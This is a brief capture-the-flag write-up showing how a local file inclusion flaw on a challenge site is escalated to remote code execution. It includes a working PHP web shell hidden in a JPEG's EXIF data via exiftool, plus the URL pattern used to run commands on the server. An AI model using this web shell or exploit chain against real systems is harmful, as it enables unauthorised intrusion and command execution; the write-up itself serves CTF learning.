# Write Up

Website = http://lfi.hax1.allesctf.net:8081/

When playing with the website, one notices that the website suffers a LFI as the title suggests. On top of that you are able to upload images and know where these are saved on the server.

To exploit this, you can escalate the LFI into a remote code execution vuln.
To do this you can hide PHP code in the exif section of a JPEG image.
Hiding php code in JPEG:
```
exiftool -DocumentName="<h1>FC3<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" im.jpg
```
Renaming the image:
```
mv im.jpg im.php.jpg
```
Now this image can simply be uploaded and used to execute commands on the server by accessing the following link:
```
http://lfi.hax1.allesctf.net:8081/index.php?site=uploads/<imagename>&cmd=<command>
```
After executing the ***ls*** command, you find out that a flag.php file exists, which can be looked at by executing ***cat flag.php***. The flag can then be seen in burp.
